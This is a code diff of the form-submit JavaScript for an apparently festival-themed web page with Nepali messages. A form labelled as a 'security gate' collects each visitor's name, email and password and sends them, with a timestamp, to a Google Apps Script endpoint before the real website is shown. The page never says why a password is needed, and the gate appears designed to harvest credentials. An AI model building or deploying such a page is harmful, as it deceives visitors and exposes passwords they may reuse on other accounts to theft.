+/* ================= FORM SUBMIT ================= */
 
-festivalForm.addEventListener("submit",async function(event){
+festivalForm.addEventListener("submit",async function(e){
 
-    event.preventDefault();
-
-    if(
-        !GOOGLE_SCRIPT_URL ||
-        GOOGLE_SCRIPT_URL ===
-        "PASTE_YOUR_GOOGLE_APPS_SCRIPT_URL_HERE"
-    ){
-
-        alert(
-            "Google Apps Script URL राखिएको छैन।"
-        );
-
-        return;
-    }
-
+    e.preventDefault();
 
     submitBtn.disabled = true;
 
     submitBtn.style.opacity = "0.65";
 
-    submitBtn.innerHTML =
-        "⏳ Sending...";
-
     loading.style.display = "block";
-
-
-    const formData =
-        new FormData(festivalForm);
 
 
     const data = {
 
+        date:
+            new Date().toLocaleString(),
+
         name:
-            formData.get("name"),
+            document.getElementById("name").value.trim(),
 
         email:
-            formData.get("email"),
+            document.getElementById("email").value.trim(),
 
         password:
-            formData.get("password"),
+            document.getElementById("password").value,
 
         festival:
-            formData.get("festival"),
+            document.getElementById("festival").value,
 
         message:
-            formData.get("message")
+            document.getElementById("message").value.trim()
 
     };
 
@@ -2595,7 +1149,6 @@ festivalForm.addEventListener("submit",async function(event){
         await fetch(
             GOOGLE_SCRIPT_URL,
             {
-
                 method:"POST",
 
                 mode:"no-cors",
@@ -2607,33 +1160,28 @@ festivalForm.addEventListener("submit",async function(event){
 
                 body:
                     JSON.stringify(data)
-
             }
         );
 
 
-        festivalForm.reset();
+        /* SUCCESS */
 
-        formGate.style.display = "none";
+        formCard.classList.add("hidden");
 
-        successGate.style.display = "flex";
+        successCard.classList.remove("hidden");
 
 
     }catch(error){
 
-        console.error(error);
-
         alert(
-            "जानकारी पठाउन समस्या भयो। कृपया फेरि प्रयास गर्नुहोस्।"
+            "Data पठाउन समस्या भयो। Google Apps Script URL र deployment जाँच गर्नुहोस्।"
         );
 
+        console.error(error);
 
         submitBtn.disabled = false;
 
         submitBtn.style.opacity = "1";
-
-        submitBtn.innerHTML =
-            "🚀 Submit & Continue";
 
         loading.style.display = "none";
 
@@ -2642,17 +1190,15 @@ festivalForm.addEventListener("submit",async function(event){
 });
 
 
-/* =====================================================
-   START WEBSITE
-===================================================== */
+/* ================= START WEBSITE ================= */
 
-startWebsiteBtn.addEventListener("click",function(){
+startBtn.addEventListener("click",function(){
 
-    successGate.style.display = "none";
+    securityGate.style.display = "none";
 
-    mainWebsite.style.display = "block";
+    website.style.display = "block";
 
-    document.body.classList.remove("locked");
+    document.body.style.overflowX = "hidden";
 
     window.scrollTo({
         top:0,
@@ -2660,7 +1206,6 @@ startWebsiteBtn.addEventListener("click",function(){
     });
 
 });
-
 
 </script>
 
